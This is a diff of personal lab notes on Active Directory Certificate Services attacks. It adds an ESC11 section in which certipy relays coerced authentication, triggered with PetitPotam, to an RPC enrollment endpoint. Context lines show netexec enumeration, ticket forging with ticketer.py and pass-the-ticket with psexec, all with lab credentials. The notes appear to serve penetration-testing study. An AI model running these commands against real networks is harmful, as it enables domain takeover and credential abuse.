@@ -1,5 +1,5 @@
 ```
-netexec ldap 10.129.205.199 -u "blwasp" -p "Password123!" -M adcs
+netexec ldap 172.16.19.3 -u "blwasp" -p "Password123!" -M adcs
 ```
 %% use nxc to identify if there are any ADCS servers in the domain %%
 
@@ -285,3 +285,22 @@ ticketer.py -nthash 92bd84175886a57ab41a14731d10428a -domain-sid S-1-5-21-181721
 KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass lab-dc.lab.local
 ```
 %% pass the ticket attack with PsExec %%
+
+## ESC11
+ESC11 same as ESC8 but instead of requesting certificates via HTTP web enrollment endpoints, RPC/ICPR enrollment endpoints are utilized.
+
+```
+certipy find -u blwasp -p 'Password123!' -dc-ip 172.16.19.3 -vulnerable -stdout
+```
+%% find vulnerable servers with Certipy %%
+
+```
+sudo certipy relay -target "rpc://172.16.19.5" -ca "lab-WS01-CA" -template DomainController
+```
+%%relay the authentication to RPC endpoint. Notice the difference with ESC8, ESC8 relays authentication to a HTTP endpoint %%
+
+```
+python3 PetitPotam.py -u BlWasp -p 'Password123!' -d 'lab.local' 172.16.19.19 172.16.19.3
+```
+%% coerce authentication with PetitPotam, this is  what is then relay using certipy to the CA to get the enrolment cert that we can use to authenticate later, everything after just follow the ESC8 attack chain%%
+
